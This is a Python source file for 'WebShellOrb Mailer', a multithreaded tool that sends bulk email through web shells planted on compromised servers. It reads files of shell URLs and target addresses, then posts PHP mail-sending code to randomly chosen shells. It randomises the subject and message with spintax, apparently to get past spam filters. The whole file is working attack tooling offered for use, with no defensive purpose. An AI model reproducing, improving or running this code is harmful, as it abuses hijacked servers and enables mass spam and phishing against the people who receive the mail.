import argparse
import logging
import os
import queue
import random
import re
import sys
from threading import Thread
from typing import Tuple

import requests

__version__ = '0.1.3'

log = logging.getLogger(__name__.split('.')[0])

pattern = re.compile(r'{([^{}]+)}')
php_code = """
mb_language('uni');
mb_internal_encoding('utf-8');
$header = '';
if (isset($_POST['replyTo'])) {
  $header .= 'Reply-To: ' . $_POST['replyTo'] . "\\r\\n";
}
$header .= 'X-Mailer: PHP/' . phpversion() . "\\r\\n";
$header .= "Content-Type: text/html; charset=utf-8\\r\\n";
$res = mb_send_mail($_POST['to'], $_POST['subject'], $_POST['message'], $header);
echo($res ? 't' : 'f');
"""


def random_text(s: str) -> str:
    while True:
        r = pattern.sub(lambda m: random.choice(m.group(1).split('|')), s)
        if r == s:
            return r
        s = r


def worker(
    *, args: argparse.Namespace, q: queue.Queue, urls: Tuple[str],
) -> None:
    while True:
        email = q.get()
        if email is None:
            break
        url = random.choice(urls)
        subject = random_text(args.subject)
        message = random_text(args.message)
        data = dict(
            a='Php',
            ajax=True,
            # c='',
            p1=php_code,
            # p2='',
            # p3='',
            charset='utf-8',
            to=email,
            subject=subject,
            message=message,
        )
        if args.reply_to:
            data.update({'replyTo': args.reply_to})
        try:
            r = requests.post(url, data=data, timeout=args.timeout)
            res = r.text.split(".innerHTML='")[1].split("'")[0]
            if res != 't':
                log.warn('email not sent: %s', email)
        except Exception as ex:
            log.exception(ex)
        finally:
            q.task_done()


def print_banner() -> None:
    print(
        """
__        ______   ___  __  __       _ _
\ \      / / ___| / _ \|  \/  | __ _(_) | ___ _ __
 \ \ /\ / /\___ \| | | | |\/| |/ _` | | |/ _ \ '__|
  \ V  V /  ___) | |_| | |  | | (_| | | |  __/ |
   \_/\_/  |____/ \___/|_|  |_|\__,_|_|_|\___|_|

WebShellOrb Mailer v%s By tz4678
"""
        % __version__
    )


def main() -> int:
    try:
        parser = argparse.ArgumentParser(
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )
        parser.add_argument('message', metavar='MESSAGE', help='message')
        parser.add_argument(
            '-s', '--subject', help='subject', default='No Subject'
        )
        parser.add_argument(
            '--reply-to', dest='reply_to', help='reply-to',
        )
        parser.add_argument(
            '--urls',
            dest='urls_filename',
            help='web shell urls filename each url in new line',
            default='urls.txt',
        )
        parser.add_argument(
            '--emails',
            dest='emails_filename',
            help='emails filename each email in new line',
            default='emails.txt',
        )
        parser.add_argument(
            '-t', '--timeout', help='request timeout', default=15.0, type=float
        )
        parser.add_argument(
            '-w',
            '--workers',
            help='number of workers',
            default=os.cpu_count() * 2,
            type=int,
        )
        parser.add_argument('-l', '--logfile', help='log output filename')
        parser.add_argument(
            '-d',
            '--debug',
            help='output debug messages',
            action='store_const',
            dest='loglevel',
            const=logging.DEBUG,
            default=logging.WARNING,
        )
        parser.add_argument(
            '-v',
            '--verbose',
            help='be verbose',
            action='store_const',
            dest='loglevel',
            const=logging.INFO,
        )
        if len(sys.argv) == 1:
            print_banner()
            parser.print_usage()
            return 0
        args = parser.parse_args()
        with open(args.urls_filename) as f:
            urls = set(f.read().splitlines())
            urls = list(urls)
        with open(args.emails_filename) as f:
            emails = set(f.read().splitlines())
        logging.basicConfig()
        log.setLevel(level=args.loglevel)
        if args.logfile:
            fh = logging.FileHandler(args.logfile)
            fh.setLevel(logging.DEBUG)
            log.addHandler(fh)
        q = queue.Queue()
        for email in emails:
            q.put_nowait(email)
        num_workers = min(q.qsize(), args.workers)
        workers = []
        for _ in range(num_workers):
            t = Thread(target=worker, kwargs=dict(args=args, q=q, urls=urls),)
            t.daemon = True
            workers.append(t)
            t.start()
        q.join()
        for _ in range(num_workers):
            q.put_nowait(None)
        for i in range(num_workers):
            workers[i].join()
        log.info('finished')
        return 0
    except Exception as ex:
        print(ex, file=sys.stderr)
        return 1
